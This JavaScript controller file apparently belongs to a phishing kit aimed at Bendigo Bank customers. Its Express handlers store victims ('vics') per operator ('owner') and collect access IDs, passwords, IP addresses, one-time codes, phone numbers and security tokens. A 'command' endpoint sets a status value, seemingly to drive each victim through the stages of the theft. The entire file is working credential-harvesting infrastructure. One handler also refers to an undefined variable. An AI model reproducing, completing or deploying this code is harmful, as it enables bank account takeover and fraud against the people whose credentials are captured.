const Bendigo = require("../models/bendigoModel");

const getOwnerVics = async (req, res) => {
  const { owner } = req.params;
  Bendigo.find({ owner })
    .sort({ status: -1 })
    .exec((err, vics) => {
      if (err) {
        console.log(err);
        res.status(404).send("Error");
        return;
      }
      res.send(vics);
    });
};

const command = async (req, res) => {
  const { uniqueid, status } = req.body;
  try {
    await Bendigo.findOneAndUpdate({ uniqueid }, { status }).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const getInfo = async (req, res) => {
  const { uniqueid } = req.params;
  Bendigo.findOne({ uniqueid }).exec((err, vic) => {
    if (err) {
      console.log(err);
      res.status(404).send("Error");
      return;
    }
    res.send(vic);
  });
};

const submitLogin = async (req, res) => {
  const { accessId, password, uniqueid, owner, ip } = req.body;
  try {
    await Bendigo.create({
      uniqueid,
      accessId,
      password,
      status: 1,
      owner,
      ip,
    });
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitLoginAgain = async (req, res) => {
  const { accessId, password, uniqueid } = req.body;
  try {
    await Bendigo.findOneAndUpdate(
      { uniqueid },
      { accessId, password, tokenCode, status: 0 }
    ).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitOtp = async (req, res) => {
  const { otp, uniqueid } = req.body;
  try {
    await Bendigo.findOneAndUpdate({ uniqueid }, { otp, status: 3 }).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitPhone = async (req, res) => {
  const { telephone, uniqueid } = req.body;
  try {
    await Bendigo.findOneAndUpdate(
      { uniqueid },
      { telephone, status: 7 }
    ).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitToken = async (req, res) => {
  const { secToken, uniqueid } = req.body;
  try {
    await Bendigo.findOneAndUpdate(
      { uniqueid },
      { secToken, status: 5 }
    ).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const deleteEntry = async (req, res) => {
  const { uniqueid } = req.body;
  try {
    await Bendigo.deleteOne({ uniqueid });
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

module.exports = {
  getOwnerVics,
  command,
  getInfo,
  submitLogin,
  submitLoginAgain,
  submitOtp,
  submitToken,
  submitPhone,
  deleteEntry,
};
